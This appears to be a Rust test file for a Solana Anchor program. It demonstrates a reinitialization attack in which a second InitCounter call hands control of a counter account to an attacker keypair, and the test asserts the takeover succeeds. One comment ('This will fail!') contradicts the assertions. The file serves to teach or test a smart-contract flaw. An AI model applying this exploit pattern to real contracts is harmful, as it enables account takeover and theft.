use anchor_client::{
    solana_sdk::{
        commitment_config::CommitmentConfig,
        pubkey::Pubkey,
        signature::{read_keypair_file, Keypair, Signer},
        system_program,
    },
    Client, Cluster, Program,
};
use reinitialization::{self, accounts, instruction};
use std::sync::Arc;

fn setup_program() -> (Client<Arc<Keypair>>, Program<Arc<Keypair>>, Keypair) {
    let anchor_wallet = std::env::var("ANCHOR_WALLET").unwrap();
    let payer = Arc::new(read_keypair_file(&anchor_wallet).unwrap());
    let client = Client::new_with_options(
        Cluster::Localnet,
        Arc::clone(&payer),
        CommitmentConfig::confirmed(),
    );
    let program = client.program(reinitialization::id()).unwrap();

    (client, program, payer.insecure_clone())
}

#[test]
fn test_reinitialization() {
    let (_client, program, authority) = setup_program();

    let (counter_pda, _bump) =
        Pubkey::find_program_address(&[b"counter-seed"], &reinitialization::id());

    // Initialize
    let _tx = program
        .request()
        .accounts(accounts::InitCounter {
            counter_account: counter_pda,
            payer: authority.pubkey(),
            system_program: system_program::id(),
        })
        .args(instruction::InitCounter {
            authority: authority.pubkey(),
        })
        .send()
        .expect("Failed to send initialize account transaction");

    // Increment
    let _tx = program
        .request()
        .accounts(accounts::Increment {
            counter_account: counter_pda,
            authority: authority.pubkey(),
        })
        .args(instruction::Increment {})
        .send()
        .expect("Failed to send increment transaction");

    // Attack: Re-initialize the counter account with a new authority
    let attacker = Keypair::new();
    // This will fail!
    let _tx = program
        .request()
        .accounts(accounts::InitCounter {
            counter_account: counter_pda,
            payer: authority.pubkey(),
            system_program: system_program::id(),
        })
        .args(instruction::InitCounter {
            authority: attacker.pubkey(),
        })
        .send()
        .expect("Failed to send reinitialize account transaction");

    // Increment the counter with the attacker's authority
    let _tx = program
        .request()
        .accounts(accounts::Increment {
            counter_account: counter_pda,
            authority: attacker.pubkey(),
        })
        .args(instruction::Increment {})
        .signer(&attacker)
        .send()
        .expect("Failed to send increment transaction");

    let counter_account: reinitialization::CounterAccount = program.account(counter_pda).unwrap();
    assert_eq!(counter_account.count, 1); // Counter should be reset to 1
    assert_eq!(counter_account.authority, attacker.pubkey()); // Authority should be changed to attacker
}
